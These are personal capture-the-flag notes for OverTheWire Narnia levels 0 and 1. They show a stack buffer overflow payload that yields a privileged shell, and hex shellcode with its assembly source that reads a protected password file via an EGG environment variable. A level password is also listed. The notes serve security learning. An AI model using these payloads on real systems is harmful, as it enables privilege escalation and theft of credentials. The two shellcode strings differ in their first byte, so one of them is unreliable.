# Narnia Notes
[My notes for Wargame Narnia on overthewire](https://overthewire.org/wargames/narnia/)

pass
1 efeidiedae




## 0 -> 1
A buffer overflow:

The C code:
```C
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```


so val gets called (has 4 bytes)

then buf gets called (reserves 20 bytes)

Our allowed input is 24, so that means 20 will go into buf then the remaining
4 will overflow into val (since val gets called first, it is higher in the
memory stack than buf... and I think since they were called immediately one
after the other, there is nothing in betweeen them) We want our last 4 bytes
to be the hex value '0xdeadbeef'


So this is my solution (lesson learned from pwnable.kr bof):
```bash
(echo `python -c "print(20*'A'+'\xef\xbe\xad\xde')"`; cat) | ./narnia0 
```
here's a more elegant one:
```bash
(echo -e "AAAABBBBCCCCDDDDEEEE\xef\xbe\xad\xde"; cat) | ./narnia0 
```

(Note: the -e allows echo to interpret escape characters)






## 1 -> 2 Shellcode injection

the c code:
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

So it checks if EGG is an env variable and if so, getenv() is called on it


Here's the working solution:

```bash
export  EGG=`perl -e 'print "\x32\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'`
```

or

```bash
export EGG=`python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"'`
```

here's the assembly that came from:


`cat mycat.asm`

```
BITS 32
xor eax,eax
cdq
mov byte al,11
push edx
push long 0x7461632f ; tac/
push long 0x6e69622f ; nib/
mov ebx,esp
push edx
push long 0x3261696e ; 2ain
push long 0x72616e2f ; ran/
push long 0x73736170 ; ssap
push long 0x5f61696e ; _ain
push long 0x72616e2f ; ran/
push long 0x6374652f ; cte/
mov ecx,esp
push edx
mov edx,esp
push ecx
push ebx
mov ecx,esp
int 0x80
```

```bash
nasm -f elf mycat.asm && ld -o mycat mycat.o
od2sc mycat
```
```
"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80"
```
